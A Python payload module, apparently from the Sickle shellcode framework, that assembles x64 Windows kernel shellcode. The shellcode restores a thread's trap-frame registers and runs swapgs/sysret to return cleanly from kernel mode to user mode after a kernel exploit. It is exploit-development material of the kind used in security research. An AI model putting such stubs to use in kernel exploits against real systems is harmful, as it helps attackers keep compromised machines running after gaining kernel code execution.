import sys
import math
import struct
import binascii

from sickle.common.lib.reversing.assembler import Assembler
from sickle.common.lib.generic.mparser import argument_check

class Shellcode():

    name = "Windows (x64) Kernel SYSRET Shellcode"

    module = "windows/x64/kernel_sysret"

    example_run = f"{sys.argv[0]} -p windows/x64/kernel_sysret -f c"

    platform = "Windows"

    arch = "x64"

    ring = 0

    author = ["Kristal-g", "wetw0rk"]

    tested_platforms = ["Windows 11", "Windows 10"]

    summary = "Kernel shellcode for returning to user-mode from kernel-mode"

    description = """
    This shellcode stub will restore a threads execution context, ultimately
    transitioning from kernel-mode to user-mode. This helps avoid manually having
    to restore execution flow from an exploit development perspective.
    """

    arguments = None

    def __init__(self, arg_object):


        self.arg_list = arg_object["positional arguments"]
        self.builder = Assembler(Shellcode.arch)

        return

    def generate_source(self):
        shellcode = """
        _start:
            mov rax, qword ptr gs:[0x188]    ; _KPCR.Prcb.CurrentThread
            mov cx, word ptr [rax + 0x1e4]   ; KTHREAD.KernelApcDisable
            inc cx
            mov word ptr [rax + 0x1e4], cx
            mov rdx, [rax + 0x90]            ; ETHREAD.TrapFrame
            mov rcx, [rdx + 0x168]           ; ETHREAD.TrapFrame.Rip
            mov r11, [rdx + 0x178]           ; ETHREAD.TrapFrame.EFlags
            mov rsp, [rdx + 0x180]           ; ETHREAD.TrapFrame.Rsp
            mov rbp, [rdx + 0x158]           ; ETHREAD.TrapFrame.Rbp
            xor eax, eax                     ;
            swapgs
            sysret                           ; Will get converted into sysretq
        """

        return shellcode

    def get_shellcode(self):
        """Generates Kernel SYSRET Shellcode
        """

        return self.builder.get_bytes_from_asm(self.generate_source())

def generate():
    return Shellcode().get_shellcode()
